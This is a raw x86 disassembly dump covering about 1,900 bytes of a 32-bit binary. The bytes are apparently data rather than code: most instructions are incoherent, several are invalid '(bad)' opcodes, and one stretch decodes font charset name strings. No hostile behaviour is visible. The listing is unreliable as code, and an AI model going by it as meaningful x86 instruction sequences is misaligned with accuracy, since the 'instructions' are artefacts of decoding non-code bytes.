  4095cc:	outs   dx,DWORD PTR ds:[esi]
  4095cd:	ja     0x40955f
  4095cf:	push   DWORD PTR [edx+0x7b]
  4095d2:	lahf   
  4095d3:	jne    0x40961c
  4095d5:	or     DWORD PTR [esi+0x75],eax
  4095d8:	arpl   WORD PTR [eax+0x73],bp
  4095db:	imul   esp,DWORD PTR [ecx-0x1b],0x413ee1a7
  4095e2:	jno    0x409659
  4095e4:	and    BYTE PTR [edi],al
  4095e6:	push   edi
  4095e7:	push   0x36657469
  4095ec:	rol    DWORD PTR [esi+0x65000cc8],0x79
  4095f3:	jmp    0xd6c52cf8
  4095f8:	mov    dl,0x7
  4095fa:	push   ebx
  4095fb:	imul   edi,DWORD PTR [ecx-0x43],0x77
  4095ff:	and    eax,0x9c3b5c10
  409604:	ins    DWORD PTR es:[edi],dx
  409605:	inc    edi
  409606:	dec    ebp
  409607:	data16 mov ch,0x52
  40960a:	jp     0x409644
  40960c:	repnz fisttp WORD PTR [esi]
  40960f:	arpl   WORD PTR [eax+eiz*2+0x42],si
  409613:	(bad)  
  409614:	dec    ebx
  409615:	mov    esi,0x2fc25e81
  40961a:	cmovae esp,DWORD PTR [ecx-0x6c]
  40961e:	push   cs
  40961f:	int3   
  409620:	push   ebx
  409621:	call   FWORD PTR [edi+0x70]
  409624:	jo     0x409639
  409626:	cmp    BYTE PTR [eax-0x58],al
  409629:	mov    eax,0xcb76b6b
  40962e:	sub    al,0x34
  409630:	and    dl,BYTE PTR cs:[edi+eiz*2+0x70]
  409635:	outs   dx,BYTE PTR ds:[esi]
  409636:	fs mov bh,0xf6
  409639:	adc    DWORD PTR ds:[edi],ebp
  40963c:	inc    edx
  40963d:	je     0x4096ad
  40963f:	inc    esi
  409640:	push   ebp
  409641:	xchg   DWORD PTR [esi],esp
  409643:	push   0x48fbd990
  409648:	imul   esp,DWORD PTR [edi+0x68],0x2f74066c
  40964f:	or     edx,DWORD PTR [ebx+0x27]
  409652:	aas    
  409653:	fsub   DWORD PTR [ecx+0x7f6c64ca]
  409659:	push   esp
  40965a:	gs js  0x4096d1
  40965d:	or     eax,0x2c16d6cf
  409662:	sub    ebp,DWORD PTR [edi]
  409664:	push   edi
  409665:	inc    esp
  409666:	gs data16 (bad) 
  409669:	mov    eax,ds:0x7561e418
  40966e:	ins    BYTE PTR es:[edi],dx
  40966f:	pop    ss
  409670:	xchg   edi,eax
  409671:	imul   eax,DWORD PTR fs:[edi],0x2a9c0a9b
  409678:	lahf   
  409679:	sbb    DWORD PTR [edi],edi
  40967b:	dec    ecx
  40967c:	fs mov es,ecx
  40967f:	inc    esp
  409680:	in     al,dx
  409681:	inc    ebx
  409682:	pop    ds
  409683:	or     dl,BYTE PTR [edx-0x50]
  409686:	xor    BYTE PTR [edi],0xd9
  409689:	push   edi
  40968a:	or     DWORD PTR [edi+0x7b],0xf27e909
  409691:	pop    ecx
  409692:	jg     0x4096dc
  409694:	outs   dx,DWORD PTR ds:[esi]
  409695:	je     0x4096a4
  409697:	outs   dx,DWORD PTR ds:[esi]
  409698:	cdq    
  409699:	or     BYTE PTR [edi+edx*8+0x10],0xdf
  40969e:	repz adc eax,DWORD PTR [ebx+ecx*8]
  4096a2:	ins    BYTE PTR es:[edi],dx
  4096a3:	aaa    
  4096a4:	adc    DWORD PTR [edi],edx
  4096a6:	adc    eax,0x6010d76f
  4096ab:	aaa    
  4096ac:	pop    es
  4096ad:	or     BYTE PTR [edi],bh
  4096af:	outs   dx,WORD PTR ds:[esi]
  4096b1:	add    eax,0x42a66e43
  4096b6:	push   0xde7f0a27
  4096bb:	sbb    bl,dh
  4096bd:	xor    DWORD PTR [esi],eax
  4096bf:	pop    ss
  4096c0:	outs   dx,BYTE PTR ds:[esi]
  4096c1:	jne    0x40973a
  4096c3:	pop    ds
  4096c4:	xor    ah,ah
  4096c6:	sbb    ebp,DWORD PTR [eax]
  4096c8:	xchg   BYTE PTR [eax],dl
  4096ca:	daa    
  4096cb:	nop    edx
  4096ce:	fadd   DWORD PTR [edi+ecx*8+0xa]
  4096d2:	das    
  4096d3:	lahf   
  4096d4:	dec    esi
  4096d5:	xchg   ebx,eax
  4096d6:	jecxz  0x409698
  4096d8:	xor    BYTE PTR [esi],ch
  4096da:	aas    
  4096db:	push   ebx
  4096dc:	arpl   WORD PTR [eax],bx
  4096de:	add    bl,BYTE PTR [eax-0xf]
  4096e1:	jmp    0x40971b
  4096e3:	mov    ds:0x44443347,al
  4096e8:	imul   eax,ecx,0x15
  4096eb:	ins    BYTE PTR es:[edi],dx
  4096ec:	jo     0x409699
  4096ee:	outs   dx,DWORD PTR ds:[esi]
  4096ef:	das    
  4096f0:	cmp    eax,0xbb5c528f
  4096f5:	not    BYTE PTR [edi+0x69]
  4096f8:	outs   dx,BYTE PTR ds:[esi]
  4096f9:	dec    edi
  4096fa:	or     eax,0xb81a4627
  4096ff:	and    DWORD PTR [ebx+0x73],ebx
  409702:	aad    0xaf
  409704:	das    
  409705:	adc    eax,0xa101e500
  40970a:	adc    ah,al
  40970c:	or     ebx,ebx
  40970e:	ror    BYTE PTR [edi],cl
  409710:	mov    esp,0x6a4ba3e9
  409715:	xor    edi,DWORD PTR [ecx-0x27102240]
  40971b:	cmp    ebp,ecx
  40971d:	sbb    bh,bh
  40971f:	pop    ds
  409720:	out    dx,al
  409721:	fmul   QWORD PTR [edi-0x1e501]
  409727:	inc    ecx
  409728:	dec    esi
  409729:	push   ebx
  40972a:	dec    ecx
  40972b:	pop    edi
  40972c:	inc    ebx
  40972d:	dec    eax
  40972e:	inc    ecx
  40972f:	push   edx
  409730:	push   ebx
  409731:	inc    ebp
  409732:	push   esp
  409733:	add    BYTE PTR [edi],cl
  409735:	inc    esp
  409736:	inc    ebp
  409737:	inc    esi
  409738:	inc    ecx
  409739:	push   ebp
  40973a:	dec    esp
  40973b:	ficomp DWORD PTR [edi]
  40973d:	mov    ds:0x8f3554b1,al
  409742:	push   ebx
  409743:	pop    ecx
  409744:	dec    ebp
  409745:	inc    edx
  409746:	dec    edi
  409747:	dec    esp
  409748:	arpl   bp,sp
  40974a:	pusha  
  40974b:	cmovno esi,edi
  40974e:	dec    ebp
  40974f:	inc    ecx
  409750:	inc    ebx
  409751:	push   edi
  409752:	adc    ah,ch
  409754:	push   ss
  409755:	pusha  
  409756:	jg     0x4097a0
  409758:	dec    ecx
  409759:	inc    esi
  40975a:	push   esp
  40975b:	dec    edx
  40975c:	dec    ecx
  40975d:	push   ebx
  40975e:	mov    edi,0x45474e22
  409763:	shr    BYTE PTR [ebp+0x67c1cfb5],0xd
  40976a:	dec    edx
  40976b:	dec    edi
  40976c:	and    BYTE PTR [edx+0x61],al
  40976f:	jns    0x409784
  409771:	repnz xchg edi,ebp
  409774:	inc    edi
  409775:	inc    edx
  409776:	xor    dh,BYTE PTR [ebx]
  409778:	xor    DWORD PTR [edx],esi
  40977a:	adc    eax,esi
  40977c:	inc    ebx
  40977d:	in     al,0x8f
  40977f:	div    BYTE PTR [esi+0x4222454e]
  409785:	dec    ecx
  409786:	inc    edi
  409787:	xor    eax,0x45524797
  40978c:	inc    ebp
  40978d:	dec    ebx
  40978e:	and    edi,ecx
  409790:	sbb    ebp,DWORD PTR [edi+esi*4]
  409793:	push   esp
  409794:	push   ebp
  409795:	push   edx
  409796:	dec    ebx
  409797:	dec    ecx
  409798:	push   ebx
  409799:	dec    eax
  40979a:	imul   ebx,ebx,0x5a
  40979d:	mov    bl,0x48
  40979f:	mov    WORD PTR [edx+0x57],fs
  4097a2:	(bad)  
  4097a3:	das    
  4097a4:	sbb    al,0x41
  4097a6:	mov    esi,0x5a9f242e
  4097ab:	inc    ebx
  4097ac:	das    
  4097ad:	inc    edx
  4097ae:	inc    ecx
  4097af:	dec    esp
  4097b0:	push   esp
  4097b1:	mov    edi,0xfe40ee68
  4097b6:	push   edx
  4097b7:	push   ebp
  4097b8:	push   ebx
  4097b9:	push   ebx
  4097ba:	dec    ecx
  4097bb:	inc    ecx
  4097bc:	dec    esi
  4097bd:	or     al,0xef
  4097bf:	push   ds
  4097c0:	dec    ecx
  4097c1:	js     0x4097b6
  4097c3:	addr16 push 0x41451217
  4097c9:	push   ebx
  4097ca:	push   esp
  4097cb:	push   edx
  4097cc:	dec    edi
  4097cd:	push   eax
  4097ce:	inc    ebp
  4097cf:	loop   0x4097e0
  4097d1:	jns    0x40983d
  4097d3:	scas   eax,DWORD PTR es:[edi]
  4097d4:	dec    edi
  4097d5:	inc    ebp
  4097d6:	dec    ebp
  4097d7:	push   0x11
  4097d9:	mov    ecx,0xac255560
  4097de:	loop   0x40978d
  4097e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097e1:	pop    ds
  4097e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097e3:	inc    esp
  4097e4:	shr    DWORD PTR [edx],cl
  4097e6:	or     eax,0x4b4b4c7
  4097eb:	mov    eax,0x230e30bc
  4097f0:	dec    BYTE PTR [ecx]
  4097f2:	in     eax,0x31
  4097f4:	xchg   ebx,eax
  4097f5:	inc    ebx
  4097f6:	adc    BYTE PTR [esi-0x3],cl
  4097f9:	inc    eax
  4097fa:	js     0x4097ff
  4097fc:	sub    cl,BYTE PTR [edi]
  4097fe:	test   DWORD PTR [ebx],esi
  409800:	add    eax,ebx
  409802:	mov    al,0x24
  409804:	fst    QWORD PTR [ebp-0x3e6fe38]
  40980a:	push   ebp
  40980b:	mov    ebp,0x490fb049
  409810:	out    0xef,al
  409812:	add    BYTE PTR [ebx],cl
  409814:	je     0x4097c1
  409816:	push   esp
  409817:	call   0xccc8:0xc408ac83
  40981e:	div    DWORD PTR cs:[esi-0x1d]
  409822:	push   esi
  409824:	inc    eax
  409825:	sbb    DWORD PTR [ecx],eax
  409827:	je     0x409832
  409829:	mov    DWORD PTR [ebp-0x30],0x7ebc0bc
  409830:	adc    BYTE PTR [eax+0x124dd9aa],dl
  409836:	xor    WORD PTR [edx],ax
  409839:	mov    edx,0x19d44588
  40983e:	jle    0x40986e
  409840:	and    edx,DWORD PTR [edi-0x29f72afc]
  409846:	mov    al,BYTE PTR [eax+0x1a]
  409849:	fsub   QWORD PTR [ecx]
  40984b:	xor    ebp,edx
  40984d:	adc    bh,dl
  40984f:	pop    eax
  409850:	mov    BYTE PTR [ebx-0x1df6e43e],0x76
  409857:	dec    ebp
  409858:	out    dx,eax
  409859:	sbb    bh,BYTE PTR [edx+0x3d1231fc]
  40985f:	push   edx
  409860:	mov    DWORD PTR [edi+0x1a],0xf67d9f2a
  409867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409868:	xchg   esi,eax
  409869:	loopne 0x4098a5
  40986b:	mov    ah,0x54
  40986d:	adc    al,0x63
  40986f:	enter  0x19eb,0x70
  409873:	test   BYTE PTR [ecx-0x26],0x92
  409877:	mov    ah,0x34
  409879:	mov    ah,0xc6
  40987b:	inc    ebp
  40987c:	fiadd  DWORD PTR [eax]
  40987e:	push   es
  40987f:	test   eax,esi
  409881:	xor    ebx,DWORD PTR [esi+0x2259d9d8]
  409887:	add    BYTE PTR [edx+0x5d026f7e],dh
  40988d:	push   es
  40988e:	push   es
  40988f:	loopne 0x4098b9
  409891:	fild   DWORD PTR [edx]
  409893:	jmp    0x40989f
  409895:	or     al,BYTE PTR [ecx]
  409897:	jmp    0x40989d
  409899:	sti    
  40989a:	je     0x4098ae
  40989c:	jo     0x409824
  40989e:	outs   dx,DWORD PTR ds:[esi]
  40989f:	sbb    BYTE PTR [esi-0x5a6cf7bd],dl
  4098a5:	mov    ah,0x73
  4098a7:	les    edi,FWORD PTR [ebx]
  4098a9:	jno    0x4098c3
  4098ab:	push   es
  4098ac:	or     BYTE PTR [ecx+0x1a],al
  4098af:	or     BYTE PTR [edi+0xeb4e20f],ah
  4098b5:	sbb    ebx,DWORD PTR [eax+0x49]
  4098b8:	in     al,dx
  4098b9:	xor    DWORD PTR [edx],esi
  4098bb:	lods   al,BYTE PTR ds:[esi]
  4098bc:	adc    al,0x34
  4098be:	xchg   edx,eax
  4098bf:	mov    ah,0xa9
  4098c1:	and    BYTE PTR [eax+eax*8+0x6e533722],ch
  4098c8:	inc    edx
  4098c9:	mov    eax,ds:0x18ead040
  4098ce:	pop    ss
  4098cf:	in     al,dx
  4098d0:	sbb    bh,BYTE PTR [ecx]
  4098d2:	push   eax
  4098d3:	jl     0x4098ff
  4098d5:	daa    
  4098d6:	jne    0x409950
  4098d8:	mov    eax,ds:0x32921fcc
  4098dd:	or     ecx,DWORD PTR [ecx]
  4098df:	fisttp QWORD PTR [ebx]
  4098e1:	jne    0x40991b
  4098e3:	adc    ah,dl
  4098e5:	sbb    al,0xf
  4098e7:	or     bh,BYTE PTR [eax]
  4098e9:	ins    DWORD PTR es:[edi],dx
  4098ea:	icebp  
  4098eb:	mov    bh,0x4
  4098ed:	inc    ebp
  4098ee:	lock cli 
  4098f0:	jbe    0x4098de
  4098f2:	xchg   ah,al
  4098f4:	addr16 mov cl,0xdd
  4098f7:	dec    ebp
  4098f8:	js     0x409918
  4098fa:	push   esp
  4098fb:	cmp    BYTE PTR [esi+0x32c0f217],bl
  409901:	test   eax,0xcc329928
  409906:	loopne 0x409931
  409908:	sbb    al,0x40
  40990a:	inc    eax
  40990b:	or     BYTE PTR [edi+0x6e0b92c7],bh
  409911:	and    cl,BYTE PTR [edi+edi*1+0x614667f0]
  409918:	enter  0xbbb3,0x0
  40991c:	ror    BYTE PTR [esi-0x7f],1
  40991f:	mul    DWORD PTR [eax]
  409921:	leave  
  409922:	jns    0x409957
  409924:	inc    edi
  409925:	jnp    0x4098c0
  409927:	or     DWORD PTR [ecx-0x30],0xffffff93
  40992b:	test   BYTE PTR [esi],bl
  40992d:	sub    al,0x2f
  40992f:	xor    esi,DWORD PTR [edx+0x6c678097]
  409935:	das    
  409936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409937:	(bad)  
  409938:	in     eax,0x92
  40993a:	shl    BYTE PTR [eax+esi*1+0x36],1
  40993e:	or     ebp,ebx
  409940:	push   ebp
  409941:	and    al,0x7e
  409943:	sbb    al,0x8b
  409945:	rol    BYTE PTR [eax+0x9be01ea],1
  40994b:	jmp    0x40995d
  40994d:	sub    esi,eax
  40994f:	into   
  409950:	mov    bl,0xf3
  409952:	adc    al,0xb4
  409954:	je     0x409957
  409956:	push   ds
  409957:	adc    BYTE PTR [edx],al
  409959:	jae    0x409960
  40995b:	out    dx,eax
  40995c:	xchg   ebp,eax
  40995d:	fsub   st(0),st
  40995f:	add    ah,BYTE PTR [ecx-0x33]
  409962:	hlt    
  409963:	repnz mov esp,0x10f04b90
  409969:	xor    BYTE PTR [ebx],0xd0
  40996c:	popf   
  40996d:	xor    DWORD PTR [esp+edx*1+0x6fbf01f],eax
  409974:	push   0x6f
  409976:	daa    
  409977:	push   0x43ff2bb0
  40997c:	push   eax
  40997d:	sbb    DWORD PTR [ebx-0x48],ecx
  409980:	inc    eax
  409981:	sbb    al,0xc0
  409983:	pop    eax
  409984:	pop    ebx
  409985:	jecxz  0x4099c5
  409987:	cwde   
  409988:	test   BYTE PTR [edi],al
  40998a:	mov    dl,BYTE PTR ds:0xa9d0b8e4
  409990:	cmp    bh,0xab
  409993:	and    eax,0x57006a5c
  409998:	push   esi
  409999:	pop    ecx
  40999a:	dec    ebx
  40999b:	push   0xb423947b
  4099a0:	add    al,0xff
  4099a2:	xchg   edi,eax
  4099a3:	scas   eax,DWORD PTR es:[edi]
  4099a4:	jno    0x409936
  4099a6:	xlat   BYTE PTR ds:[ebx]
  4099a7:	pop    eax
  4099a8:	jp     0x4099de
  4099aa:	xor    al,0x7b
  4099ac:	push   eax
  4099ad:	and    DWORD PTR [ebx],eax
  4099af:	mov    al,gs:0x8c77b500
  4099b5:	aam    0x7
  4099b7:	sbb    eax,0x4e3b3523
  4099bc:	xor    BYTE PTR [esi+0x3],al
  4099bf:	jne    0x409a33
  4099c1:	ja     0x409a1a
  4099c3:	xor    BYTE PTR [ecx+eiz*1],al
  4099c6:	scas   eax,DWORD PTR es:[edi]
  4099c7:	xor    eax,eax
  4099c9:	jno    0x409a16
  4099cb:	cmp    ecx,eax
  4099cd:	and    BYTE PTR ds:0x348c595f,0x83
  4099d4:	rcl    DWORD PTR [ecx],0xc
  4099d7:	push   ebx
  4099d8:	inc    eax
  4099d9:	push   eax
  4099da:	dec    edi
  4099db:	jmp    0x74664fd2
  4099e0:	clc    
  4099e1:	mov    esi,edx
  4099e3:	dec    esp
  4099e4:	add    BYTE PTR [esi-0x20],ch
  4099e7:	ins    DWORD PTR es:[edi],dx
  4099e8:	pop    ebx
  4099e9:	pop    ss
  4099ea:	mov    eax,0x55ed5a59
  4099ef:	les    ebp,FWORD PTR [ecx]
  4099f1:	jg     0x409a66
  4099f3:	add    al,0xb4
  4099f5:	dec    eax
  4099f6:	mov    al,ds:0xf78e3508
  4099fb:	ja     0x409a14
  4099fd:	cli    
  4099fe:	call   eax
  409a00:	and    al,BYTE PTR [ebx+0x8]
  409a03:	mov    dl,BYTE PTR [ebx+0x8]
  409a06:	cmp    dl,al
  409a08:	je     0x409a41
  409a0a:	mov    eax,ds:0x9d568a88
  409a0f:	jo     0x4099b2
  409a11:	mov    WORD PTR [ebp+0x20],gs
  409a14:	outs   dx,DWORD PTR ds:[esi]
  409a15:	jae    0x409a2e
  409a17:	mov    ebx,0x3a75901c
  409a1c:	es jno 0x409a55
  409a1f:	mov    BYTE PTR [edx+esi*8],al
  409a22:	rcl    DWORD PTR [ebx],1
  409a24:	mov    dl,0x31
  409a26:	pop    ebx
  409a27:	dec    DWORD PTR [esi+0x4a]
  409a2a:	pop    ds
  409a2b:	jl     0x409a81
  409a2d:	and    BYTE PTR [edi],bh
  409a2f:	pop    esi
  409a30:	es dec edi
  409a32:	and    al,0xac
  409a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a35:	outs   dx,DWORD PTR ds:[esi]
  409a36:	inc    ecx
  409a37:	lahf   
  409a38:	fcom   DWORD PTR [ecx]
  409a3a:	push   0xded43c0
  409a3f:	jmp    0x8052:0x7c43c585
  409a46:	dec    ebp
  409a47:	mov    ds:0x863e0fe,al
  409a4c:	(bad)  
  409a4d:	sbb    al,0x11
  409a4f:	or     BYTE PTR [ebx+0x8],0x1
  409a53:	fmul   QWORD PTR [ebp-0x267aded7]
  409a59:	push   ebx
  409a5a:	sbb    BYTE PTR [ebp-0x74],dl
  409a5d:	xchg   DWORD PTR [ebp+0x5b1bffbf],esp
  409a63:	lock mov bl,BYTE PTR [esi+0x8]
  409a67:	not    ebx
  409a69:	and    bl,BYTE PTR [esp]
  409a6c:	mov    al,ds:0xc33af2d0
  409a71:	je     0x409ac6
  409a73:	(bad)  
  409a74:	push   esp
  409a75:	(bad)  
  409a76:	xchg   ebp,eax
  409a77:	lock and al,0x43
  409a7a:	adc    DWORD PTR [ebp-0x4bf57ff1],0xfffffffe
  409a81:	adc    BYTE PTR [edi-0x48],dl
  409a84:	pop    es
  409a85:	add    bl,dl
  409a87:	xchg   edx,eax
  409a88:	hlt    
  409a89:	push   eax
  409a8a:	add    bh,BYTE PTR [ebp+0x69]
  409a8d:	push   es
  409a8e:	imul   ecx,DWORD PTR ds:0x416d05c,0x883508fc
  409a98:	(bad)  
  409a99:	ds es sub al,0xa
  409a9d:	mov    edx,0x675a0488
  409aa2:	dec    ebx
  409aa3:	rcl    edi,0x60
  409aa6:	or     DWORD PTR [eax+esi*1],0x20
  409aaa:	pop    eax
  409aab:	in     eax,0x22
  409aad:	addr16 (bad) 
  409aaf:	xchg   esi,eax
  409ab0:	mov    ds:0x98291848,al
  409ab5:	pop    esi
  409ab6:	push   edi
  409ab7:	mov    ecx,0x10cf901a
  409abc:	and    cl,BYTE PTR [eax]
  409abe:	adc    BYTE PTR [eax+ebx*1+0x42835db9],ah
  409ac5:	and    BYTE PTR [edi-0x70],ch
  409ac8:	pop    edi
  409ac9:	adc    al,0xdd
  409acb:	fcmovu st,st(0)
  409acd:	push   edi
  409ace:	test   al,0x25
  409ad0:	mov    al,ds:0x23237b1b
  409ad5:	mov    ebp,ebx
  409ad7:	stos   BYTE PTR es:[edi],al
  409ad8:	test   BYTE PTR [eax-0x5fc4db2e],cl
  409ade:	out    dx,eax
  409adf:	bound  esi,QWORD PTR [eax]
  409ae1:	xor    ebp,esp
  409ae3:	sub    BYTE PTR [edx+0x2],0xa5
  409ae7:	mov    BYTE PTR [edi-0x5b],al
  409aea:	mov    cl,0xe4
  409aec:	call   0xb7c2:0x77014b28
  409af3:	mov    ebx,0x66fbf879
  409af8:	mov    DWORD PTR [ebp+0x1003000f],0x3d08fbfa
  409b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b03:	mov    cl,0xba
  409b05:	dec    esi
  409b06:	push   cs
  409b07:	mov    ecx,0x612b0801
  409b0c:	push   eax
  409b0d:	dec    ebp
  409b0e:	jns    0x409a98
  409b10:	xchg   ebx,eax
  409b11:	push   ebx
  409b12:	jmp    0x409acc
  409b14:	push   edi
  409b15:	test   eax,0x16286a37
  409b1a:	mov    esi,0x48a7a225
  409b1f:	(bad)  
  409b21:	call   0xce6da3d2
  409b26:	mov    WORD PTR [edx-0x57af8451],cs
  409b2c:	cvtdq2ps xmm0,XMMWORD PTR [eax]
  409b2f:	cmp    al,0x3d
  409b31:	pop    eax
  409b32:	cmp    DWORD PTR [ebp-0x3d531ce8],0xc0b2ba
  409b3c:	xor    al,0x4c
  409b3e:	ds push ss
  409b40:	push   cs
  409b41:	cmovnp esp,DWORD PTR [ebx+0x22]
  409b45:	add    dl,BYTE PTR [eax-0x10]
  409b48:	(bad)  
  409b49:	sbb    edx,eax
  409b4b:	inc    edi
  409b4c:	inc    edx
  409b4d:	std    
  409b4e:	lea    eax,[ebp+eax*4-0x725b8020]
  409b55:	sub    eax,0x53076e20
  409b5a:	cmp    ebp,DWORD PTR [edx+0x1c]
  409b5d:	mov    dl,0x69
  409b5f:	(bad)  
  409b60:	pop    ecx
  409b61:	cs daa 
  409b63:	jmp    0x409b83
  409b65:	addr16 fsubr st(7),st
  409b68:	mov    WORD PTR [ebx],ss
  409b6a:	dec    eax
  409b6b:	shl    BYTE PTR [esi+0x8],cl
  409b6e:	add    eax,DWORD PTR [ecx+0x641b8135]
  409b74:	sub    edx,DWORD PTR [ecx-0x3b33e218]
  409b7a:	ja     0x409bec
  409b7c:	(bad)  
  409b7d:	icebp  
  409b7e:	push   edi
  409b7f:	and    BYTE PTR [edi+0xfa84806],bl
  409b85:	hlt    
  409b86:	mov    eax,ds:0x245f5628
  409b8b:	mov    eax,0x2034bc96
  409b90:	bound  edi,QWORD PTR [eax]
  409b92:	enter  0x3a99,0xdc
  409b96:	or     eax,0x597c005e
  409b9b:	and    bh,BYTE PTR [esi]
  409b9d:	sub    eax,0x6dd9ea19
  409ba2:	aaa    
  409ba3:	dec    ecx
  409ba4:	xlat   BYTE PTR ds:[ebx]
  409ba5:	sub    al,0x0
  409ba7:	fisub  WORD PTR [ebx]
  409ba9:	in     al,0x33
  409bab:	ins    DWORD PTR es:[edi],dx
  409bac:	cmp    ch,dh
  409bae:	cmp    BYTE PTR [ecx-0x74d7cc92],cl
  409bb4:	inc    ecx
  409bb5:	xor    al,0x50
  409bb7:	jp     0x409b5e
  409bb9:	into   
  409bba:	sub    DWORD PTR [eax+eax*2],esp
  409bbd:	sub    edi,edi
  409bbf:	dec    ebp
  409bc0:	push   ss
  409bc1:	pushf  
  409bc2:	arpl   WORD PTR [edi+0x32],bx
  409bc5:	push   DWORD PTR [ebp-0x56]
  409bc8:	dec    ebx
  409bc9:	imul   ebx,DWORD PTR [ecx],0xa148d2ac
  409bcf:	icebp  
  409bd0:	aaa    
  409bd1:	pop    ebp
  409bd2:	dec    esi
  409bd3:	loopne 0x409bdf
  409bd5:	jg     0x409bdb
  409bd7:	rcr    DWORD PTR [eax],0x2f
  409bda:	jns    0x409c20
  409bdc:	jl     0x409bbf
  409bde:	retf   0x3904
  409be1:	inc    eax
  409be2:	pop    esp
  409be3:	mov    bh,0xe3
  409be5:	jge    0x409bfa
  409be7:	into   
  409be8:	push   eax
  409be9:	adc    eax,0xb03017bd
  409bee:	xlat   BYTE PTR ds:[ebx]
  409bef:	les    esp,FWORD PTR [eax+0x6c]
  409bf2:	push   0xffffffff
  409bf4:	xor    DWORD PTR [eax-0x63],edi
  409bf7:	popa   
  409bf8:	popfw  
  409bfa:	or     eax,0x259b8604
  409bff:	test   al,0x2b
  409c01:	xor    BYTE PTR [edi-0x27f9f720],cl
  409c07:	sbb    DWORD PTR [ebx+edx*4+0xb],esi
  409c0b:	cmp    DWORD PTR [esi+0x40],edx
  409c0e:	dec    ebx
  409c0f:	sub    bh,ah
  409c11:	push   edi
  409c12:	std    
  409c13:	push   ebp
  409c14:	or     DWORD PTR [ebx],edi
  409c16:	jno    0x409c86
  409c18:	pop    edx
  409c19:	or     DWORD PTR [eax-0x5d],0x7dc28884
  409c20:	jnp    0x409c96
  409c22:	sub    eax,0x942cb8e8
  409c27:	daa    
  409c28:	test   ebx,ebx
  409c2a:	into   
  409c2b:	arpl   WORD PTR [eax+ebp*2-0x5d],si
  409c2f:	jl     0x409c67
  409c31:	mov    edi,0xf6c4dea
  409c36:	enter  0x1b3,0x7b
  409c3a:	mul    DWORD PTR [edi]
  409c3c:	pop    edi
  409c3d:	add    DWORD PTR ds:0x5f1fe9f8,0x54
  409c44:	adc    eax,0xed889360
  409c49:	aas    
  409c4a:	add    al,0x8a
  409c4c:	pop    esp
  409c4d:	and    al,0x34
  409c4f:	push   esi
  409c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c51:	fimul  WORD PTR [edi]
  409c53:	neg    DWORD PTR [edx+eax*8]
  409c56:	cmp    BYTE PTR [edi],ah
  409c58:	push   0x48
  409c5a:	mov    eax,ds:0xf982add
  409c5f:	inc    DWORD PTR [ecx]
  409c61:	ins    BYTE PTR es:[edi],dx
  409c62:	enter  0xd8f7,0xa3
  409c66:	cwde   
  409c67:	push   ebx
  409c68:	call   0x402d:0x7c095854
  409c6f:	retf   
  409c70:	aaa    
  409c71:	in     al,dx
  409c72:	sub    DWORD PTR [edi+esi*2-0x78],eax
  409c76:	cmp    edi,0x3e
  409c79:	sub    al,0x80
  409c7b:	jne    0x409ca7
  409c7d:	mov    esi,0x10bf8cec
  409c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c83:	add    al,ah
  409c85:	push   ds
  409c86:	nop
  409c87:	arpl   WORD PTR [edi+0x9],si
  409c8a:	mov    BYTE PTR ds:0x82fa0a9e,bl
  409c90:	(bad)  
  409c91:	jnp    0x409ca2
  409c93:	jb     0x20b31f05
  409c99:	sub    BYTE PTR [edi-0x7d],0x53
  409c9d:	sbb    DWORD PTR [edx+0x62],0xffffff83
  409ca1:	dec    esi
  409ca2:	dec    eax
  409ca3:	cmp    al,BYTE PTR [ebp+0x778506ea]
  409ca9:	aas    
  409caa:	and    BYTE PTR [edi+0x4d],dh
  409cad:	dec    eax
  409cae:	jo     0x409d03
  409cb0:	nop
  409cb1:	dec    esi
  409cb2:	mov    eax,0xc8086a12
  409cb7:	hlt    
  409cb8:	lock jne 0x409ccf
  409cbb:	mov    eax,ds:0x676fa146
  409cc0:	adc    BYTE PTR [eax+0x1f],0x20
  409cc4:	mov    bh,0x2a
  409cc6:	shl    BYTE PTR [ebp+0x12],1
  409cc9:	or     eax,DWORD PTR [edx+0x5d]
  409ccc:	push   esi
  409ccd:	ja     0x409d1f
  409ccf:	pop    ds
  409cd0:	and    al,0x16
  409cd2:	pop    ds
  409cd3:	cmp    ah,BYTE PTR [eax+0x46]
  409cd6:	frstor [ebx-0x330c8f5]
  409cdc:	lahf   
  409cdd:	mov    eax,0x7856b1c7
  409ce2:	leave  
  409ce3:	and    DWORD PTR [ebx],edi
  409ce5:	mov    eax,DWORD PTR [eax]
  409ce7:	push   edx
  409ce8:	fnstenv [eax]
  409cea:	inc    ecx
  409ceb:	fisttp DWORD PTR [ebp+0x28]
  409cee:	cmp    bl,BYTE PTR [ebx-0x35]
  409cf1:	or     eax,0x4fba07d2
  409cf6:	jo     0x409ce4
  409cf8:	pop    es
  409cf9:	out    dx,eax
  409cfa:	mov    al,ds:0x83a7e390
  409cff:	sbb    eax,eax
  409d01:	jmp    0x409d52
  409d03:	lods   eax,DWORD PTR ds:[esi]
  409d04:	enter  0x9668,0x96
  409d08:	mov    edi,0x714214fe
  409d0d:	enter  0x3c1d,0x80
  409d11:	xor    BYTE PTR [esi-0x62],dl
  409d14:	xor    ch,ah
  409d16:	mov    ebx,0xa101d8f5
  409d1b:	and    al,0x56
  409d1d:	adc    esp,DWORD PTR [eax]
  409d1f:	mov    cl,0x43
  409d21:	fimul  DWORD PTR [ebx]
  409d23:	out    0x27,al
  409d25:	xor    BYTE PTR [eax],ch
  409d27:	aam    0x59
  409d29:	push   cs
  409d2a:	cmp    esp,esp
  409d2c:	fmul   st,st(0)
  409d2e:	adc    ecx,esp
  409d30:	sar    BYTE PTR [esp+ebp*1+0x0],1
  409d34:	(bad)  
  409d35:	je     0x409d42
  409d37:	cmp    BYTE PTR [eax-0x68],ch
  409d3a:	test   eax,0x261f5814
  409d3f:	sti    
  409d40:	sbb    BYTE PTR [eax+0x12485560],bh
  409d46:	ror    BYTE PTR [edx+ebx*4],cl
  409d49:	lods   al,BYTE PTR ds:[esi]
  409d4a:	dec    esp
  409d4b:	cli    
  409d4c:	(bad)  
  409d4d:	sub    BYTE PTR [edx+eax*2],dh
  409d50:	push   cs
  409d51:	mov    bl,0x12
  409d53:	inc    edi
